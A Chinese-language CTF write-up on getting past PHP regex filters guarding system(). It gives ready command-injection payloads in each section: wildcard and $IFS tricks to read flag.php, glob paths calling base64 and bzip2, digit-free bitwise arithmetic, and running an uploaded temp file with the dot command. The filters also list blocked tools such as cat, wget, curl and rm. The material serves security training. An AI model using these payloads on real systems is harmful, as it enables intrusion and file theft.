## **不可字符分割绕过**
```
$c=$_GET['c'];
if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
```
若flag在当前目录的flag.php中
下面均可
```
?c=vi$IFS????????   //类似vi flag.php F12可以看到源码
?c=uniq$IFS????????
?c=uniq${IFS}????????
?c=/bin/c??$IFS????????    //在bin目录中读取c??  其实就是cat了
?c=grep${IFS}'{'${IFS}fl???php
（在 fl???php匹配到的文件中，查找含有{的文件，并打印出包含 { 的这一行）
```

^
## **无字符绕过**
```
if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    } 
```
若flag在当前目录的flag.php中
/bin/base64 flag.php
```
?c=/???/????64 ????.???
```
/usr/bin/bzip2 flag.php
压缩后访问/flag.php.bz2下载获得flag
```
?c=/???/???/????2 ????.???
```


^
## **无数字创数字**
```
//已知flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}
```
我们要绕过正则变一个36出来
![](.topwrite/assets/image_1732956831826.png)
```
?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))) ))))
```


^
## **没有过滤.的命令执行**
```
// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}
```
因为没有过滤'.'，而点命令在linux中是source的缩写，通过点命令，我们可以在没有执行权限的情况下执行sh命令。
原理是通过POST上传一个文件，文件内容是要执行的命令，并且同时点命令执行该文件，形成条件竞争。这个文件默认保存在/tmp/phpxxxx路径下，所以可以通过/???/????????[@-[]来来构成这个路径，[@-[]为匹配ascii码范围在@-[的字（A，Z被屏蔽，所以范围大一位），之所以用[@-[]是因为直接用/???/?????????匹配到的其他文件都是小写字母，只有php临时生成的文件才包含大写字母。就算这样，也不一定能够准确地匹配到我们的上传文件，所以可能要多次刷新。

使用postman或其他，POST上传临时文件，文件名任意
```
#!/bin/sh
ls
```
传参
```
?c=.%20/???/????????[@-[]
```